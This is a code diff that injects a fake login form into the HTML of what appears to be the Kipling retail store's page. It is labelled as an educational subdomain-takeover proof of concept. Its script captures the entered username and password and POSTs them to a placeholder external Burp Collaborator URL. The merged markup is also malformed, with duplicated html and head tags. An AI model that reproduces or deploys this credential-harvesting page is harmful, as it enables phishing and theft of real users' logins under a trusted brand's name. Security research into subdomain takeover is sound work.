@@ -1,5 +1,60 @@
 
- <!doctype html><html lang="en"><head > <meta charset="utf-8"/>
+ <!doctype html><html lang="en"><head > 
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"/>
+  <meta name="robots" content="NOINDEX,NOFOLLOW"/>
+  <meta name="description" content="Subdomain takeover PoC for educational purposes"/>
+
+  <title>Subdomain Takeover PoC - Login</title>
+  
+  <!-- Burp Collaborator link: change this to your own Burp Collaborator server URL -->
+  <script>
+    function sendToBurpCollaborator(username, password) {
+      const collaboratorURL = 'http://YOUR_BURP_COLLAB_SERVER_URL_HERE'; // Replace with your Burp Collaborator server URL
+
+      // Send login details to the Burp Collaborator server
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', collaboratorURL, true);
+      xhr.setRequestHeader('Content-Type', 'application/json');
+      xhr.send(JSON.stringify({
+        username: username,
+        password: password
+      }));
+    }
+
+    // Capture form submission and send data to Burp Collaborator
+    function handleLogin(event) {
+      event.preventDefault();  // Prevent default form submission
+
+      // Get form values
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      // Send login details to Burp Collaborator
+      sendToBurpCollaborator(username, password);
+
+      // Optionally, you can redirect the user after sending
+      // window.location.href = 'your-redirect-url';
+    }
+  </script>
+</head>
+<body>
+
+  <h1>Login Here</h1>
+  
+  <form id="loginForm" onsubmit="handleLogin(event)">
+    <label for="username">Username:</label><br>
+    <input type="text" id="username" name="username" required><br><br>
+
+    <label for="password">Password:</label><br>
+    <input type="password" id="password" name="password" required><br><br>
+
+    <input type="submit" value="Login">
+  </form>
+
+</body> <meta charset="utf-8"/>
 <meta name="title" content="Kipling Backpacks, Bags &amp; Luggage | Kipling Official Store INT"/>
 <meta name="description" content="Kipling Handbags, Backpacks &amp; Luggage are wardrobe favourites worldwide. Affordable &amp; functional, they’re a lifestyle essential. Free shipping on orders from €39. Returns always free."/>
 <meta name="robots" content="NOINDEX,NOFOLLOW"/>
